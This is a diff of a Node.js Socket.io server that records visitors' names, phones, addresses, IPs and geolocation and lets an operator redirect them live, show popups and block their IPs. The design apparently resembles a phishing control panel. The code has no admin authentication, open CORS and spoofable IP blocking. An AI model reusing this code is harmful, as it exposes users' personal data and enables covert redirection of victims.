@@ -1,4 +1,3 @@
-// استيراد الحزم الأساسية
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
@@ -7,183 +6,145 @@ const fs = require('fs');
 const path = require('path');
 
 const app = express();
+app.use(cors({ origin: "*", methods: ["GET", "POST"] }));
 
-// تفعيل CORS
-app.use(cors({
-    origin: "*",
-    methods: ["GET", "POST"]
-}));
-app.use(express.json());
-
-const server = http.createServer(app);
-
-// إعداد Socket.io
-const io = new Server(server, {
-    cors: {
-        origin: "*",
-        methods: ["GET", "POST"]
-    }
-});
-
-// ====== نظام حظر الـ IP ======
 const BLOCKED_FILE = path.join(__dirname, 'blocked_ips.json');
 let blockedIPs = new Set();
-
-// تحميل قائمة المحظورين من الملف عند تشغيل السيرفر
 try {
-    if (fs.existsSync(BLOCKED_FILE)) {
-        const raw = fs.readFileSync(BLOCKED_FILE, 'utf-8');
-        const arr = JSON.parse(raw);
-        if (Array.isArray(arr)) blockedIPs = new Set(arr);
-        console.log(`🛡️ تم تحميل ${blockedIPs.size} IP محظور`);
-    }
-} catch (e) {
-    console.warn('⚠️ فشل تحميل ملف المحظورين:', e.message);
+  if (fs.existsSync(BLOCKED_FILE)) {
+    blockedIPs = new Set(JSON.parse(fs.readFileSync(BLOCKED_FILE, 'utf8')));
+  }
+} catch (e) { console.error('load blocked_ips failed', e); }
+
+function saveBlocked() {
+  fs.writeFileSync(BLOCKED_FILE, JSON.stringify([...blockedIPs], null, 2));
 }
 
-function saveBlockedIPs() {
-    try {
-        fs.writeFileSync(BLOCKED_FILE, JSON.stringify([...blockedIPs], null, 2));
-    } catch (e) {
-        console.warn('⚠️ فشل حفظ ملف المحظورين:', e.message);
-    }
+function getClientIP(req) {
+  const xff = req.headers['x-forwarded-for'];
+  if (xff) return xff.split(',')[0].trim();
+  return (req.connection?.remoteAddress || req.socket?.remoteAddress || '').replace('::ffff:', '');
 }
 
-// استخراج IP الحقيقي للزائر
-function getClientIp(req) {
-    const fwd = req.headers['x-forwarded-for'];
-    if (fwd) return fwd.split(',')[0].trim();
-    return req.socket.remoteAddress || '';
-}
-
-// ====== Endpoint يفحصه الموقع الرئيسي عند كل تحميل ======
-app.get('/check-block', (req, res) => {
-    const ip = getClientIp(req);
-    res.set('Cache-Control', 'no-store');
-    res.json({ ip, blocked: blockedIPs.has(ip) });
+app.use((req, res, next) => {
+  const ip = getClientIP(req);
+  if (blockedIPs.has(ip)) {
+    return res.status(403).send('403 Forbidden - Your IP has been blocked.');
+  }
+  next();
 });
 
-// (اختياري) endpoint بسيط للتأكد ان السيرفر شغال
-app.get('/', (req, res) => {
-    res.send('Server is running ✅');
-});
+const server = http.createServer(app);
+const io = new Server(server, { cors: { origin: "*", methods: ["GET", "POST"] } });
 
-// تخزين المستخدمين النشطين
-let activeUsers = {};
-
-// حظر الاتصالات القادمة من IP محظور على مستوى socket
 io.use((socket, next) => {
-    const fwd = socket.handshake.headers['x-forwarded-for'];
-    const ip = fwd ? fwd.split(',')[0].trim() : socket.handshake.address;
-    if (blockedIPs.has(ip)) {
-        console.log(`⛔ اتصال مرفوض من IP محظور: ${ip}`);
-        return next(new Error('blocked'));
-    }
-    socket.data.ip = ip;
-    next();
+  const ip = (socket.handshake.headers['x-forwarded-for']?.split(',')[0].trim())
+    || socket.handshake.address.replace('::ffff:', '');
+  if (blockedIPs.has(ip)) return next(new Error('blocked'));
+  socket.data.ip = ip;
+  next();
 });
+
+// ====== كاش الموقع الجغرافي لكل IP ======
+const geoCache = new Map();
+
+async function lookupGeo(ip) {
+  if (!ip || ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
+    return { country: 'محلي', countryCode: '', city: '' };
+  }
+  if (geoCache.has(ip)) return geoCache.get(ip);
+  try {
+    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,city&lang=ar`);
+    const data = await res.json();
+    if (data.status === 'success') {
+      const geo = { country: data.country || '', countryCode: data.countryCode || '', city: data.city || '' };
+      geoCache.set(ip, geo);
+      return geo;
+    }
+  } catch (e) { console.warn('geo lookup failed', e.message); }
+  const empty = { country: '', countryCode: '', city: '' };
+  geoCache.set(ip, empty);
+  return empty;
+}
+
+const activeUsers = {};
 
 io.on('connection', (socket) => {
-    console.log(`📡 متصل جديد: ${socket.id} - IP: ${socket.data.ip}`);
 
-    // 1. تسجيل مستخدم من الموقع الرئيسي
-    socket.on('register_user', (data) => {
-        const userId = data.userId || socket.id;
+  socket.on('register_user', async (data) => {
+    // إزالة أي جلسة سابقة لنفس المستخدم
+    for (const sid in activeUsers) {
+      if (activeUsers[sid].userId === data.userId) {
+        delete activeUsers[sid];
+      }
+    }
 
-        activeUsers[socket.id] = {
-            socketId: socket.id,
-            userId: userId,
-            name: data.name || '',
-            phone: data.phone || '',
-            address: data.address || '',
-            ip: socket.data.ip,
-            currentPage: data.currentPage || 'صفحة التحميل',
-            connectedAt: new Date()
-        };
+    const geo = await lookupGeo(socket.data.ip);
 
-        console.log(`👤 مستخدم: ${userId} في: ${activeUsers[socket.id].currentPage}`);
-        sendActiveUsersToAdmins();
-    });
+    activeUsers[socket.id] = {
+      socketId: socket.id,
+      userId: data.userId,
+      name: data.name || "",
+      phone: data.phone || "",
+      address: data.address || "",
+      currentPage: data.currentPage,
+      ip: socket.data.ip,
+      country: geo.country,
+      countryCode: geo.countryCode,
+      city: geo.city,
+      connectedAt: new Date().toISOString(),
+    };
+    sendActiveUsersToAdmins();
+  });
 
-    // 2. تسجيل الادمن
-    socket.on('register_admin', () => {
-        socket.join('admins_room');
-        console.log(`👑 أدمن متصل: ${socket.id}`);
-        socket.emit('update_users_list', Object.values(activeUsers));
-        socket.emit('update_blocked_list', [...blockedIPs]);
-    });
+  socket.on('update_page', (data) => {
+    if (activeUsers[socket.id]) {
+      activeUsers[socket.id].currentPage = data.currentPage;
+      sendActiveUsersToAdmins();
+    }
+  });
 
-    // 3. أمر التوجيه من الادمن للمستخدم
-    socket.on('admin_redirect_user', (data) => {
-        const { targetSocketId, redirectUrl } = data;
-        if (targetSocketId && redirectUrl) {
-            console.log(`🔄 توجيه [${targetSocketId}] إلى: [${redirectUrl}]`);
-            io.to(targetSocketId).emit('execute_redirect', { url: redirectUrl });
-        }
-    });
+  socket.on('register_admin', () => {
+    socket.join('admins_room');
+    sendActiveUsersToAdmins();
+  });
 
-    // 4. إرسال رسالة/popup من الادمن للمستخدم
-    socket.on('admin_send_popup', (data) => {
-        const { targetSocketId, title, message, type } = data;
-        if (targetSocketId) {
-            io.to(targetSocketId).emit('show_popup', {
-                title: title || 'تنبيه',
-                message: message || '',
-                type: type || 'info'
-            });
-        }
-    });
+  socket.on('admin_redirect_user', ({ targetSocketId, redirectUrl }) => {
+    io.to(targetSocketId).emit('execute_redirect', { url: redirectUrl });
+  });
 
-    // 5. حظر IP معين
-    socket.on('admin_block_ip', (data) => {
-        const ip = (data && data.ip) ? String(data.ip).trim() : '';
-        if (!ip) return;
+  socket.on('admin_show_popup', ({ targetSocketId, title, message, type }) => {
+    io.to(targetSocketId).emit('show_popup', { title, message, type });
+  });
 
-        blockedIPs.add(ip);
-        saveBlockedIPs();
-        console.log(`⛔ تم حظر IP: ${ip}`);
+  socket.on('admin_block_user', ({ targetSocketId }) => {
+    const user = activeUsers[targetSocketId];
+    if (!user || !user.ip) return;
+    blockedIPs.add(user.ip);
+    saveBlocked();
+    console.log(`[BLOCK] IP ${user.ip} (${user.userId}) blocked`);
 
-        // فصل كل الاتصالات الحالية لنفس الـ IP
-        for (const [sid, u] of Object.entries(activeUsers)) {
-            if (u.ip === ip) {
-                const s = io.sockets.sockets.get(sid);
-                if (s) {
-                    s.emit('you_are_blocked');
-                    s.disconnect(true);
-                }
-                delete activeUsers[sid];
-            }
-        }
+    for (const [sid, u] of Object.entries(activeUsers)) {
+      if (u.ip === user.ip) {
+        io.to(sid).emit('execute_redirect', { url: '/blocked' });
+        const s = io.sockets.sockets.get(sid);
+        if (s) setTimeout(() => s.disconnect(true), 500);
+      }
+    }
+    sendActiveUsersToAdmins();
+  });
 
-        io.to('admins_room').emit('update_blocked_list', [...blockedIPs]);
-        sendActiveUsersToAdmins();
-    });
-
-    // 6. فك الحظر
-    socket.on('admin_unblock_ip', (data) => {
-        const ip = (data && data.ip) ? String(data.ip).trim() : '';
-        if (!ip) return;
-        blockedIPs.delete(ip);
-        saveBlockedIPs();
-        console.log(`✅ تم فك حظر IP: ${ip}`);
-        io.to('admins_room').emit('update_blocked_list', [...blockedIPs]);
-    });
-
-    // 7. الخروج
-    socket.on('disconnect', () => {
-        if (activeUsers[socket.id]) {
-            console.log(`❌ خرج: ${activeUsers[socket.id].userId}`);
-            delete activeUsers[socket.id];
-            sendActiveUsersToAdmins();
-        }
-    });
+  socket.on('disconnect', () => {
+    if (activeUsers[socket.id]) {
+      delete activeUsers[socket.id];
+      sendActiveUsersToAdmins();
+    }
+  });
 });
 
 function sendActiveUsersToAdmins() {
-    io.to('admins_room').emit('update_users_list', Object.values(activeUsers));
+  io.to('admins_room').emit('update_users_list', Object.values(activeUsers));
 }
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-    console.log(`🚀 السيرفر يعمل على المنفذ: ${PORT}`);
-});
+server.listen(PORT, () => console.log(`[SERVER] Port: ${PORT}`));
